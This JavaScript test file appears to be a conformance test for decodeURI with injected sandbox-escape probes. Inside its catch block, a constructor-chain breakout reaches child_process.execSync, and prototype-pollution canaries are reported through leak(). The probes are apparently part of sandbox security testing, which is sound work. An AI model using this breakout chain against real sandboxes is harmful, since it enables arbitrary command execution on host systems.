try {
    if (decodeURI('%3b') !== '%3b') {
        $ERROR('#1: decodeURI("%3b") equal "%3b", not ";" or "%3B"');
    }
    if (decodeURI('%2f') !== '%2f') {
        $ERROR('#2: decodeURI("%2f") equal "%2f", not "/" or "%2F"');
    }
    if (decodeURI('%3f') !== '%3f') {
        $ERROR('#3: decodeURI("%3f") equal "%3f", not "?" or "%3F"');
    }
    if (decodeURI('%3a') !== '%3a') {
        $ERROR('#4: decodeURI("%3a") equal "%3a", not ":" or "%3A"');
    }
    if (decodeURI('%40') !== '%40') {
        $ERROR('#5: decodeURI("%40") equal "%40", not "@"');
    }
    if (decodeURI('%26') !== '%26') {
        $ERROR('#6: decodeURI("%26") equal "%26", not "&"');
    }
    if (decodeURI('%3d') !== '%3d') {
        $ERROR('#7.1: decodeURI("%3d") equal "%3d", not "=" or "%3D"');
    }
    if (decodeURI('%2b') !== '%2b') {
        $ERROR('#8.1: decodeURI("%2b") equal "%2b", not "+" or "%2B"');
    }
    if (decodeURI('%24') !== '%24') {
        $ERROR('#9: decodeURI("%24") equal "%24", not "$"');
    }
    if (decodeURI('%2c') !== '%2c') {
        $ERROR('#10: decodeURI("%2c") equal "%2c", not "," or "%2C"');
    }
    if (decodeURI('%23') !== '%23') {
        $ERROR('#11: decodeURI("%23") equal "%23", not "#"');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}